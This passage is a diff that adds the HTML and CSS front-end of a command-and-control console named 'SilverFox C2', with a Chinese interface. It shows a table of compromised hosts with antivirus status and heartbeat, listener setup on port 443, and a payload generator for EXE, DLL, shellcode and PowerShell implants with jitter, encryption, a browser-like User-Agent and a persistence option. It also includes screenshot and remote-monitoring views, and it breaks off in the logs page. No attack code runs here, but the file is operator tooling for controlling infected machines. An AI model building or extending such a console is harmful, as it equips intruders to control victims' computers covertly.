@@ -1,0 +1,1754 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>SilverFox C²</title>
+<style>
+:root{
+  --bg: #000;
+  --bg1: #0a0a0a;
+  --bg2: #0f0f0f;
+  --bg3: #141414;
+  --border: #1a1a1a;
+  --border-light: #222;
+  --accent: #06b6d4;
+  --accent-hover: #22d3ee;
+  --accent-dim: #0e3a44;
+  --green: #22c55e;
+  --green-dim: #0e2a15;
+  --red: #ef4444;
+  --red-dim: #2a0e0e;
+  --orange: #f97316;
+  --white: #e5e7eb;
+  --gray: #6b7280;
+  --gray-light: #9ca3af;
+  --gray-dark: #374151;
+  --font: "Segoe UI","Microsoft YaHei","PingFang SC",sans-serif;
+  --mono: "Cascadia Code","Fira Code","JetBrains Mono",Consolas,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{background:#000;overflow:hidden}
+body{font-family:var(--font);font-size:13px;background:#000;color:var(--white);height:100vh;display:flex;flex-direction:column;overflow:hidden}
+a{color:var(--accent);text-decoration:none}
+a:hover{color:var(--accent-hover)}
+
+/* ===== TOP BAR ===== */
+#topbar{
+  height:40px;background:#050505;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 12px;gap:14px;user-select:none;
+}
+#topbar .logo{font-size:14px;font-weight:700;color:var(--accent);letter-spacing:2px}
+#topbar .logo span{color:var(--gray);font-weight:400;font-size:11px;margin-left:6px}
+#topbar .t-sep{width:1px;height:18px;background:var(--border-light)}
+#topbar .t-status{font-size:11px;color:var(--gray);display:flex;align-items:center;gap:6px}
+#topbar .t-status .dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 4px var(--green)}
+#topbar .t-toolbar{display:flex;gap:1px;flex:1;justify-content:center}
+.tb-btn{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  min-width:44px;height:36px;background:transparent;border:none;
+  color:var(--gray);font-size:10px;font-family:inherit;cursor:pointer;
+  border-radius:3px;transition:all .15s;gap:2px;
+}
+.tb-btn:hover{color:var(--accent-hover);background:rgba(6,182,212,0.06)}
+.tb-btn.active{color:var(--accent);background:rgba(6,182,212,0.1)}
+.tb-btn svg{width:15px;height:15px}
+#topbar .t-right{display:flex;align-items:center;gap:12px}
+#topbar .t-clock{font-size:11px;color:var(--gray-light);font-family:var(--mono)}
+#topbar .t-ver{font-size:10px;color:var(--gray);background:#111;padding:2px 8px;border-radius:3px;border:1px solid var(--border)}
+
+/* ===== MAIN ===== */
+#main{display:flex;flex:1;overflow:hidden}
+
+/* ===== SIDEBAR ===== */
+#sidebar{
+  width:200px;min-width:200px;background:#050505;
+  display:flex;flex-direction:column;
+  border-right:1px solid var(--border);
+}
+.s-section{padding:10px 10px 6px;border-bottom:1px solid var(--border)}
+.s-section .s-label{font-size:10px;text-transform:uppercase;color:var(--gray-dark);letter-spacing:1px;margin-bottom:4px}
+.s-count{font-size:11px;color:var(--gray);display:flex;align-items:center;gap:6px;margin:4px 0 0 6px}
+.s-count b{color:var(--accent);font-size:13px}
+
+.s-list{flex:1;overflow-y:auto;padding:4px}
+.s-empty{text-align:center;padding:28px 10px;color:var(--gray-dark);font-size:11px}
+.s-empty .icon{font-size:24px;margin-bottom:6px;opacity:.3}
+#sClearBtn:hover{color:var(--white)}
+#sSearch:focus{border-color:var(--accent)}
+
+.s-agent{
+  background:#080808;border:1px solid var(--border);border-radius:4px;
+  padding:8px 10px;margin:2px 0 3px;cursor:pointer;transition:all .15s;
+}
+.s-agent:hover{border-color:var(--accent-dim)}
+.s-agent.sel{border-color:var(--accent);background:rgba(6,182,212,0.04)}
+.s-agent .sa-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:3px}
+.s-agent .sa-id{font-size:11px;font-weight:600;color:var(--accent);font-family:var(--mono)}
+.s-agent .sa-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 4px var(--green)}
+.s-agent.offline .sa-dot{background:var(--gray-dark);box-shadow:none}
+.s-agent .sa-info{font-size:10px;color:var(--gray);display:flex;gap:6px;flex-wrap:wrap}
+
+.s-nav{border-top:1px solid var(--border);padding:4px}
+.s-nav-item{
+  display:flex;align-items:center;gap:6px;padding:6px 10px;
+  color:var(--gray);font-size:12px;cursor:pointer;border-radius:4px;transition:all .15s;
+}
+.s-nav-item:hover{color:var(--white);background:rgba(6,182,212,0.05)}
+.s-nav-item.active{color:var(--accent);background:rgba(6,182,212,0.08);border-left:2px solid var(--accent)}
+.s-nav-item svg{width:14px;height:14px;flex-shrink:0}
+.s-nav-badge{
+  margin-left:auto;font-size:10px;font-weight:600;min-width:18px;height:18px;
+  line-height:18px;text-align:center;border-radius:9px;padding:0 5px;
+  background:rgba(6,182,212,0.12);color:var(--accent);
+}
+.s-nav-badge.zero{background:transparent;color:var(--gray-dark)}
+
+/* ===== CONTENT ===== */
+#content{flex:1;display:flex;flex-direction:column;overflow:hidden;background:#000}
+
+.page{display:none;flex:1;flex-direction:column;overflow:hidden}
+.page.active{display:flex}
+
+/* Summary Cards */
+.summary-row{display:flex;gap:8px;padding:10px 0}
+.summary-card{
+  flex:1;background:#080808;border:1px solid var(--border);border-radius:6px;
+  padding:12px 16px;display:flex;align-items:center;gap:10px;
+}
+.sc-icon{width:34px;height:34px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:15px}
+.sc-on .sc-icon{background:var(--green-dim);color:var(--green)}
+.sc-off .sc-icon{background:rgba(249,115,22,0.1);color:var(--orange)}
+.sc-today .sc-icon{background:rgba(6,182,212,0.1);color:var(--accent)}
+.sc-total .sc-icon{background:rgba(107,114,128,0.1);color:var(--gray-light)}
+.sc-val{font-size:20px;font-weight:700;line-height:1.2}
+.sc-on .sc-val{color:var(--green)}
+.sc-off .sc-val{color:var(--orange)}
+.sc-today .sc-val{color:var(--accent)}
+.sc-total .sc-val{color:var(--gray-light)}
+.sc-label{font-size:10px;color:var(--gray)}
+
+/* Table */
+.table-section{flex:1;display:flex;flex-direction:column;overflow:hidden;padding:0 0 12px}
+.table-header{padding:8px 0;display:flex;align-items:center;justify-content:space-between}
+.th-title{font-size:12px;font-weight:600;color:var(--white)}
+.th-actions{display:flex;gap:6px}
+.btn{
+  background:transparent;border:1px solid var(--gray-dark);color:var(--gray);
+  padding:3px 12px;font-size:11px;font-family:inherit;border-radius:4px;cursor:pointer;transition:all .15s;
+}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.accent{background:var(--accent);color:#000;border-color:var(--accent);font-weight:600}
+.btn.accent:hover{background:var(--accent-hover)}
+.btn.danger{border-color:var(--red-dim);color:var(--red)}
+.btn.danger:hover{background:var(--red);color:#fff;border-color:var(--red)}
+.btn.sm{padding:2px 8px;font-size:10px}
+.btn:disabled{opacity:0.4;cursor:not-allowed}
+
+.table-wrap{flex:1;overflow:auto;background:#080808;border:1px solid var(--border);border-radius:4px}
+table{width:100%;border-collapse:collapse}
+thead{position:sticky;top:0;z-index:2}
+th{
+  text-align:left;padding:8px 10px;font-size:10px;font-weight:600;
+  color:var(--gray);background:#0a0a0a;border-bottom:1px solid var(--accent-dim);white-space:nowrap;
+}
+td{padding:7px 10px;border-bottom:1px solid var(--border);font-size:11px;white-space:nowrap}
+td.geo-col{max-width:100px;overflow:hidden;text-overflow:ellipsis;padding-right:24px}
+td.av-col{padding-left:24px}
+tbody tr{transition:background .1s}
+tbody tr:hover{background:rgba(6,182,212,0.03)}
+tbody tr.sel{background:rgba(6,182,212,0.06);border-left:2px solid var(--accent)}
+.empty-row td{text-align:center;padding:40px 20px;color:var(--gray);font-size:12px}
+.dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:5px;vertical-align:middle}
+.dot.on{background:var(--green);box-shadow:0 0 4px var(--green)}
+.dot.off{background:var(--gray-dark)}
+
+/* ===== LISTENER PANEL ===== */
+.panel-grid{display:flex;flex-direction:column;gap:10px;padding:10px 0;flex:1;overflow:auto}
+.panel-card{
+  background:#080808;border:none;border-radius:6px;overflow:hidden;
+}
+.panel-card .pc-title{
+  padding:8px 12px;background:#0a0a0a;border-bottom:1px solid var(--border);
+  font-size:12px;font-weight:600;color:var(--white);display:flex;align-items:center;gap:8px;
+}
+.panel-card .pc-title .pc-dot{width:7px;height:7px;border-radius:50%;background:var(--green)}
+.pc-body{padding:12px}
+
+/* Listener form */
+.form-row{display:flex;gap:10px;margin-bottom:10px;align-items:flex-end;flex-wrap:wrap}
+.form-group{display:flex;flex-direction:column;gap:3px}
+.form-group label{font-size:10px;color:var(--gray);text-transform:uppercase;letter-spacing:.5px}
+.form-group input,.form-group select{
+  padding:6px 10px;background:#000;border:1px solid var(--border);
+  color:var(--white);font-size:12px;font-family:inherit;border-radius:4px;outline:none;min-width:110px;
+}
+.form-group input:focus,.form-group select:focus{border-color:var(--accent)}
+.form-group select option{background:#111;color:var(--white)}
+
+.listener-item{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:10px 0;border-bottom:1px solid var(--border);
+}
+.listener-item:last-child{border-bottom:none}
+.li-info{display:flex;align-items:center;gap:10px}
+.li-name{font-weight:600;color:var(--white);font-family:var(--mono);font-size:12px}
+.li-detail{color:var(--gray);font-size:11px}
+.li-actions{display:flex;gap:6px}
+
+/* ===== GENERATOR PANEL ===== */
+.gen-form{display:flex;flex-wrap:wrap;gap:12px;align-items:flex-end}
+.gen-preview{
+  margin-top:14px;background:#000;border:1px solid var(--border);border-radius:4px;padding:10px;
+  font-family:var(--mono);font-size:11px;color:var(--gray-light);line-height:1.7;max-height:200px;overflow:auto;white-space:pre-wrap;
+}
+
+/* ===== COMMAND PANEL ===== */
+#cmd-panel{border-top:1px solid var(--accent-dim);background:#050505;display:none}
+#cmd-panel.open{display:block}
+.cp-header{
+  height:28px;background:#0a0a0a;display:flex;align-items:center;padding:0 12px;
+  font-size:11px;font-weight:600;color:var(--accent);justify-content:space-between;
+}
+.cp-header button{background:transparent;border:none;color:var(--gray);cursor:pointer;font-size:14px}
+.cp-header button:hover{color:var(--red)}
+.cp-body{
+  height:150px;overflow-y:auto;padding:8px 12px;font-family:var(--mono);font-size:11px;line-height:1.7;background:#000;
+}
+.cp-input-row{display:flex;height:30px;border-top:1px solid var(--border)}
+.cp-input-row .cp-prompt{
+  padding:0 10px;background:#080808;color:var(--accent);
+  font-family:var(--mono);font-size:11px;font-weight:600;
+  display:flex;align-items:center;border-right:1px solid var(--border);white-space:nowrap;
+}
+.cp-input-row input{
+  flex:1;background:transparent;border:none;outline:none;
+  color:var(--white);font-family:var(--mono);font-size:11px;padding:0 10px;
+}
+.cp-input-row input::placeholder{color:var(--gray-dark)}
+.cp-input-row button{
+  background:var(--accent);border:none;color:#000;font-family:inherit;
+  font-size:10px;font-weight:700;padding:0 16px;cursor:pointer;
+}
+.cp-input-row button:hover{background:var(--accent-hover)}
+.cp-input-row button:disabled{background:var(--gray-dark);color:var(--gray);cursor:not-allowed}
+
+.log-line{white-space:pre-wrap;word-break:break-all;padding:1px 0}
+.log-line .lt{color:var(--gray);margin-right:8px;font-size:10px}
+.log-line.cmd{color:#fbbf24}
+.log-line.out{color:var(--green)}
+.log-line.err{color:var(--red)}
+.log-line.evt{color:var(--accent)}
+
+/* ===== FOOTER ===== */
+#footer{
+  height:24px;background:#050505;border-top:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;padding:0 12px;font-size:10px;
+}
+#footer .f-left{color:var(--green);display:flex;align-items:center;gap:5px}
+#footer .f-left .f-dot{width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 3px var(--green)}
+#footer .f-right{color:var(--gray);display:flex;align-items:center;gap:12px}
+
+/* scrollbar */
+::-webkit-scrollbar{width:3px;height:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border-light);border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--gray-dark)}
+::-webkit-scrollbar-corner{background:transparent}
+
+/* toast */
+.toast{position:fixed;top:50px;right:16px;padding:8px 16px;border-radius:4px;font-size:12px;z-index:999;
+  transition:all .3s;opacity:0;pointer-events:none}
+.toast.show{opacity:1}
+.toast.ok{background:var(--green-dim);color:var(--green);border:1px solid rgba(34,197,94,.3)}
+.toast.err{background:var(--red-dim);color:var(--red);border:1px solid rgba(239,68,68,.3)}
+.toast.info{background:rgba(6,182,212,.1);color:var(--accent);border:1px solid var(--accent-dim)}
+
+/* ===== LOG PAGE ===== */
+.log-toolbar{
+  height:34px;background:#050505;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 12px;gap:12px;user-select:none;
+}
+.log-title{font-size:12px;font-weight:600;color:var(--white)}
+.log-filters{display:flex;gap:4px;flex:1}
+.log-fbtn{
+  padding:2px 10px;background:transparent;border:1px solid var(--gray-dark);
+  color:var(--gray);font-size:10px;font-family:inherit;border-radius:3px;cursor:pointer;transition:all .15s;
+}
+.log-fbtn:hover{border-color:var(--accent);color:var(--accent)}
+.log-fbtn.active{background:var(--accent);color:#000;border-color:var(--accent);font-weight:600}
+.log-actions{display:flex;align-items:center;gap:8px}
+.log-autoscroll{font-size:10px;color:var(--gray);display:flex;align-items:center;gap:4px;cursor:pointer}
+.log-viewer{
+  flex:1;overflow-y:auto;padding:4px 8px;font-family:var(--mono);font-size:11px;
+  background:#000;line-height:1.8;
+}
+.log-entry{padding:1px 4px;border-radius:2px;display:flex;align-items:baseline;gap:8px;transition:background .2s}
+.log-entry.online{color:var(--green)}
+.log-entry.offline{color:var(--red)}
+.log-entry.cmd{color:#fbbf24}
+.log-entry.cmd_result{color:var(--accent)}
+.log-entry.listener{color:#a78bfa}
+.log-entry.sys{color:var(--gray)}
+.log-entry.hidden{display:none}
+.log-ts{color:var(--gray-dark);font-size:10px;min-width:62px;flex-shrink:0}
+.log-cat{font-size:10px;min-width:60px;flex-shrink:0;text-transform:uppercase;letter-spacing:.5px}
+.log-msg{flex:1;word-break:break-all}
+
+/* ===== FEATURE BAR ===== */
+#feature-bar{
+  height:28px;background:#050505;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 10px;gap:6px;overflow-x:auto;user-select:none;
+}
+.feat-item{
+  display:flex;align-items:center;gap:4px;padding:2px 8px;
+  background:#080808;border:1px solid var(--border);
+  border-radius:3px;font-size:10px;color:var(--gray);white-space:nowrap;
+  transition:all .15s;
+}
+.feat-item.done{color:var(--accent);border-color:var(--accent-dim);background:rgba(6,182,212,0.04)}
+.feat-item.wip{color:var(--accent);border-color:var(--accent-dim);background:rgba(6,182,212,0.04)}
+.feat-item .fi-dot{width:4px;height:4px;border-radius:50%}
+.feat-item.done .fi-dot{background:var(--accent);box-shadow:0 0 4px var(--accent)}
+.feat-item.wip .fi-dot{background:var(--accent);box-shadow:0 0 4px var(--accent)}
+.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;justify-content:center;align-items:center}
+.modal-overlay.show{display:flex}
+.modal-box{background:var(--panel);border:1px solid var(--border);border-radius:6px;width:480px;max-height:70vh;overflow-y:auto;padding:20px 24px}
+.modal-box h3{font-size:14px;color:var(--accent);margin:0 0 16px}
+.modal-box .info-row{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,.03);font-size:12px}
+.modal-box .info-row:last-child{border-bottom:none}
+.modal-box .info-row .lbl{color:var(--gray)}
+.modal-box .info-row .val{color:#fff;text-align:right;word-break:break-all;max-width:60%}
+.modal-close{float:right;background:none;border:none;color:var(--gray);font-size:18px;cursor:pointer}
+.modal-close:hover{color:#fff}
+.btn.sm.muted{margin-left:2px;padding:2px 5px;font-size:9px;background:rgba(255,255,255,.03);border:1px solid var(--border);color:var(--gray)}
+.btn.sm.muted:hover{color:var(--accent);border-color:var(--accent)}
+
+/* Screenshot viewer */
+#screenshot-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:300;justify-content:center;align-items:center;flex-direction:column}
+#screenshot-overlay.show{display:flex}
+#screenshot-overlay img{max-width:92vw;max-height:85vh;border:1px solid var(--border);border-radius:4px;box-shadow:0 0 30px rgba(6,182,212,0.15)}
+#screenshot-overlay .ss-bar{position:absolute;top:12px;right:16px;display:flex;gap:8px}
+#screenshot-overlay .ss-bar button{background:rgba(0,0,0,.6);border:1px solid var(--border-light);color:var(--white);padding:4px 12px;border-radius:3px;cursor:pointer;font-size:12px;font-family:inherit}
+#screenshot-overlay .ss-bar button:hover{background:var(--accent);color:#000;border-color:var(--accent)}
+#screenshot-overlay .ss-info{position:absolute;bottom:12px;color:var(--gray);font-size:10px;font-family:var(--mono)}
+.screenshot-loading{color:var(--accent);font-size:13px;display:flex;align-items:center;gap:8px}
+
+/* ===== MONITOR OVERLAY ===== */
+#monitor-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:301;flex-direction:column}
+#monitor-overlay.show{display:flex}
+#monitor-overlay .mo-top{
+  display:flex;align-items:center;justify-content:space-between;
+  height:40px;padding:0 12px;background:#080808;border-bottom:1px solid var(--border);
+  user-select:none;flex-shrink:0;
+}
+#monitor-overlay .mo-top .mo-title{font-size:13px;font-weight:600;color:var(--accent);font-family:var(--mono)}
+#monitor-overlay .mo-top .mo-stats{display:flex;gap:16px;font-size:11px;color:var(--gray)}
+#monitor-overlay .mo-top .mo-stats span{font-family:var(--mono)}
+#monitor-overlay .mo-top .mo-stats .mo-live{color:var(--green)}
+#monitor-overlay .mo-top .mo-ctrl{display:flex;gap:6px;align-items:center}
+#monitor-overlay .mo-top .mo-ctrl select{
+  padding:3px 8px;background:#000;border:1px solid var(--border);color:var(--white);
+  font-size:11px;font-family:inherit;border-radius:3px;outline:none;cursor:pointer;
+}
+#monitor-overlay .mo-top .mo-ctrl select:focus{border-color:var(--accent)}
+#monitor-overlay .mo-body{
+  flex:1;display:flex;justify-content:center;align-items:center;overflow:hidden;position:relative;
+}
+#monitor-overlay .mo-body canvas{
+  max-width:98vw;max-height:calc(100vh - 44px);
+  border:1px solid var(--border);border-radius:2px;
+  cursor:crosshair;
+}
+#monitor-overlay .mo-body canvas.cursor-default{cursor:default}
+#monitor-overlay .mo-body .mo-placeholder{
+  color:var(--gray-dark);font-size:14px;text-align:center;
+}
+#monitor-overlay .mo-body .mo-placeholder .mo-icon{font-size:48px;margin-bottom:8px;opacity:.3}
+#monitor-overlay .mo-footer{
+  height:22px;background:#050505;border-top:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;padding:0 10px;
+  font-size:10px;color:var(--gray);font-family:var(--mono);flex-shrink:0;
+}
+.feat-item.done{cursor:pointer}
+.feat-item.done:hover{color:var(--accent-hover);border-color:var(--accent);background:rgba(6,182,212,0.08)}
+.feat-item.wip{cursor:pointer}
+.feat-item.wip:hover{color:var(--accent-hover);border-color:var(--accent);background:rgba(6,182,212,0.08)}
+#feat-config-btn{color:var(--gray-dark);cursor:pointer;padding:2px 6px;border-radius:3px;transition:all .15s;font-size:13px;display:flex;align-items:center;margin-left:auto}
+#feat-config-btn:hover{color:var(--accent);background:rgba(6,182,212,0.08)}
+/* Feature Config Modal */
+#feat-modal .feat-list{max-height:380px;overflow-y:auto;margin-bottom:12px}
+.feat-item-config{display:flex;align-items:center;gap:8px;padding:8px 10px;background:#080808;border:1px solid var(--border);border-radius:4px;margin-bottom:4px;cursor:grab;transition:all .15s}
+.feat-item-config:hover{border-color:var(--accent-dim)}
+.feat-item-config.dragging{opacity:.4;border-color:var(--accent)}
+.feat-item-config.drag-over{border-color:var(--accent);background:rgba(6,182,212,0.06)}
+.feat-item-config .fi-drag{color:var(--gray-dark);cursor:grab;font-size:14px;line-height:1;flex-shrink:0}
+.feat-item-config .fi-name{flex:1;font-size:12px;color:var(--white);font-weight:500}
+.feat-item-config .fi-status{font-size:10px;padding:1px 6px;border-radius:3px;white-space:nowrap}
+.feat-item-config .fi-status.done{color:var(--accent);background:rgba(6,182,212,0.12)}
+.feat-item-config .fi-status.wip{color:var(--orange);background:rgba(249,115,22,0.12)}
+.feat-item-config .fi-status span{font-size:9px;opacity:.6}
+.feat-item-config .fi-del{color:var(--gray-dark);cursor:pointer;padding:2px 4px;border-radius:3px;transition:all .15s;background:none;border:none;font-size:14px;line-height:1}
+.feat-item-config .fi-del:hover{color:var(--red);background:rgba(239,68,68,0.1)}
+#feat-add-row{display:flex;gap:6px;align-items:center;margin-top:8px}
+#feat-add-row input{flex:1;padding:5px 8px;background:#000;border:1px solid var(--border);color:var(--white);font-size:11px;font-family:inherit;border-radius:4px;outline:none}
+#feat-add-row input:focus{border-color:var(--accent)}
+#feat-add-row select{padding:5px 6px;background:#000;border:1px solid var(--border);color:var(--white);font-size:11px;font-family:inherit;border-radius:4px;outline:none;cursor:pointer}
+#feat-add-row select:focus{border-color:var(--accent)}
+#feat-add-row select option{background:#111;color:var(--white)}
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div id="topbar">
+  <span class="logo">SilverFox<span>C2</span></span>
+  <span class="t-sep"></span>
+  <span class="t-status" id="tListener"><span class="dot off"></span>监听器 — 暂无</span>
+  <div class="t-right">
+    <span class="t-clock" id="clock">00:00:00</span>
+    <button class="tb-btn" onclick="doRefresh();this.style.transform='rotate(360deg)';setTimeout(()=>this.style.transform='',300)" style="min-width:24px;height:24px;font-size:13px" title="刷新">↻</button>
+    <span class="t-ver">v7.2-web</span>
+  </div>
+</div>
+
+<!-- FEATURE BAR -->
+<div id="feature-bar">
+  <span style="font-size:10px;color:var(--gray-dark);letter-spacing:1px;text-transform:uppercase;margin-right:6px;">Capabilities</span>
+  <span id="feat-config-btn" onclick="openFeatConfig()" title="配置功能按钮">⚙</span>
+</div>
+
+<!-- MAIN -->
+<div id="main">
+
+  <!-- SIDEBAR -->
+  <div id="sidebar">
+    <div class="s-section">
+      <div class="s-label">上线列表</div>
+      <div class="s-count">在线 <b id="sBadge">0</b></div>
+    </div>
+    <div style="padding:4px 8px;position:relative">
+      <input type="text" id="sSearch" placeholder="搜索..." oninput="filterAgents()"
+        style="width:100%;padding:5px 24px 5px 8px;background:#000;border:1px solid var(--border);border-radius:4px;color:var(--white);font-size:11px;font-family:inherit;outline:none">
+      <button id="sClearBtn" onclick="clearSearch()" title="清除搜索"
+        style="display:none;position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--gray);cursor:pointer;font-size:14px;line-height:1;padding:0">&times;</button>
+    </div>
+    <div class="s-list" id="sList">
+      <div class="s-empty" id="sEmpty"><div class="icon">▢</div>等待客户端连接...</div>
+    </div>
+    <div class="s-nav">
+      <div class="s-nav-item active" data-page="dashboard" onclick="navTo('dashboard')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>控制面板
+      </div>
+      <div class="s-nav-item" data-page="listeners" onclick="navTo('listeners')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>监听器<span class="s-nav-badge zero" id="lnBadge">0</span>
+      </div>
+      <div class="s-nav-item" data-page="generator" onclick="navTo('generator')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5 12 2"/></svg>生成器
+      </div>
+      <div class="s-nav-item" data-page="logs" onclick="navTo('logs')">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 17"/><line x1="18" y1="6" x2="18" y2="6.01"/><path d="M10.5 4H4v16h16v-6.5"/></svg>日志
+      </div>
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div id="content">
+
+    <!-- PAGE: DASHBOARD -->
+    <div class="page active" id="page-dashboard">
+      <div class="summary-row">
+        <div class="summary-card sc-on"><div class="sc-icon">●</div><div><div class="sc-val" id="scOnline">0</div><div class="sc-label">在线主机</div></div></div>
+        <div class="summary-card sc-off"><div class="sc-icon">●</div><div><div class="sc-val" id="scOffline">0</div><div class="sc-label">离线主机</div></div></div>
+        <div class="summary-card sc-today"><div class="sc-icon">●</div><div><div class="sc-val" id="scToday">0</div><div class="sc-label">今日上线</div></div></div>
+        <div class="summary-card sc-total"><div class="sc-icon">●</div><div><div class="sc-val" id="scTotal">0</div><div class="sc-label">总计管理</div></div></div>
+      </div>
+      <div class="table-section">
+        <div class="table-header">
+          <span class="th-title">主机列表</span>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead><tr>
+              <th style="width:20px"></th><th>ID</th><th>计算机名</th><th>操作系统</th>
+              <th>内网 IP</th><th>外网 IP</th><th style="width:100px">地理位置</th><th style="padding-left:24px">杀软</th>
+              <th>上线时间</th><th>最后心跳</th>
+              <th>备注</th><th style="width:130px">操作</th>
+            </tr></thead>
+            <tbody id="tBody"><tr class="empty-row"><td colspan="12">暂无数据</td></tr></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: LISTENERS -->
+    <div class="page" id="page-listeners">
+      <div class="panel-grid">
+        <div class="panel-card">
+          <div class="pc-title"><span class="pc-dot"></span>新增监听器</div>
+          <div class="pc-body">
+            <div class="form-row">
+              <div class="form-group"><label>名称</label><input type="text" id="lName" value="HTTPS-Listener" style="width:160px"></div>
+              <div class="form-group"><label>协议</label>
+                <select id="lProto"><option value="wss" selected>WSS (WebSocket+TLS)</option><option value="ws">WS (WebSocket)</option><option value="https">HTTPS</option></select>
+              </div>
+              <div class="form-group"><label>监听地址</label><input type="text" id="lAddr" value="0.0.0.0" style="width:130px"></div>
+              <div class="form-group"><label>端口</label><input type="text" id="lPort" value="443" style="width:70px"></div>
+              <div class="form-group" style="justify-content:flex-end"><button class="btn accent" onclick="addListener()" id="lBtn">启动监听</button></div>
+            </div>
+          </div>
+        </div>
+        <div class="panel-card">
+          <div class="pc-title"><span class="pc-dot"></span>活跃监听器</div>
+          <div class="pc-body" id="listenerList">
+            <div style="color:var(--gray);font-size:11px;padding:8px 0">暂无活跃监听器</div>
+          </div>
+        </div>
+        <div class="panel-card">
+          <div class="pc-title"><span class="pc-dot"></span>监听日志</div>
+          <div class="pc-body" style="max-height:150px;overflow:auto;font-family:var(--mono);font-size:11px;color:var(--gray)" id="listenerLogs">
+            <div>[系统] 监听器管理面板就绪</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: GENERATOR -->
+    <div class="page" id="page-generator">
+      <div class="panel-grid">
+        <div class="panel-card">
+          <div class="pc-title"><span class="pc-dot"></span>Payload 生成</div>
+          <div class="pc-body">
+            <div class="form-row gen-form">
+              <div class="form-group"><label>目标系统</label>
+                <select id="gOS"><option value="windows" selected>Windows (x64)</option><option value="windows_x86">Windows (x86)</option><option value="linux">Linux (x64)</option><option value="linux_arm64">Linux (ARM64)</option></select>
+              </div>
+              <div class="form-group"><label>格式</label>
+                <select id="gFormat"><option value="exe" selected>EXE</option><option value="dll">DLL</option><option value="shellcode">Shellcode</option><option value="powershell">PowerShell</option></select>
+              </div>
+              <div class="form-group"><label>协议</label>
+                <select id="gProto"><option value="wss" selected>WSS (WebSocket+TLS)</option><option value="ws">WS</option></select>
+              </div>
+              <div class="form-group"><label>C2 地址</label><input type="text" id="gHost" value="127.0.0.1" style="width:140px"></div>
+              <div class="form-group"><label>端口</label><input type="text" id="gPort" value="443" style="width:70px"></div>
+              <div class="form-group"><label>休眠 (秒)</label><input type="text" id="gSleep" value="5" style="width:60px"></div>
+              <div class="form-group"><label>抖动 (%)</label><input type="text" id="gJitter" value="20" style="width:60px"></div>
+              <div class="form-group"><label>加密</label>
+                <select id="gCrypto"><option value="aes256-gcm" selected>AES-256-GCM</option><option value="chacha20">ChaCha20-Poly1305</option></select>
+              </div>
+              <div class="form-group" style="justify-content:flex-end">
+                <button class="btn accent" onclick="genPayload()" id="gBtn">生成 Payload</button>
+              </div>
+            </div>
+            <div style="margin-top:10px">
+              <label style="font-size:10px;color:var(--gray);cursor:pointer" onclick="document.getElementById('gAdvanced').style.display=document.getElementById('gAdvanced').style.display==='none'?'block':'none'">
+                ▸ 高级选项
+              </label>
+              <div id="gAdvanced" style="display:none;margin-top:8px;display:flex;flex-wrap:wrap;gap:10px">
+                <div class="form-group"><label>User-Agent</label><input type="text" id="gUA" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" style="width:420px"></div>
+                <div class="form-group"><label>密钥交换</label>
+                  <select id="gKex"><option value="ecdh-p256" selected>ECDH-P256</option><option value="ecdh-p384">ECDH-P384</option><option value="ecdh-x25519">X25519</option></select>
+                </div>
+                <div class="form-group"><label>初始延迟 (秒)</label><input type="text" id="gDelay" value="0" style="width:70px"></div>
+                <div class="form-group"><label>最大重试</label><input type="text" id="gRetry" value="10" style="width:60px"></div>
+                <div class="form-group"><label>退出行为</label>
+                  <select id="gExit"><option value="none">仅退出进程</option><option value="persist">持久化重启</option><option value="uninstall">自卸载</option></select>
+                </div>
+              </div>
+            </div>
+            <div class="gen-preview" id="genPreview">
+              配置完成后点击「生成 Payload」按钮...
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PAGE: LOGS -->
+    <div class="page" id="page-logs">
+      <div class="log-toolbar">
+        <span class="log-title">系统日志</span>
+        <div class="log-filters">
+          <button class="log-fbtn active" data-filter="all" onclick="setLogFilter('all',this)">全部</button>
+          <button class="log-fbtn" data-filter="online" onclick="setLogFilter('online',this)">上线</button>
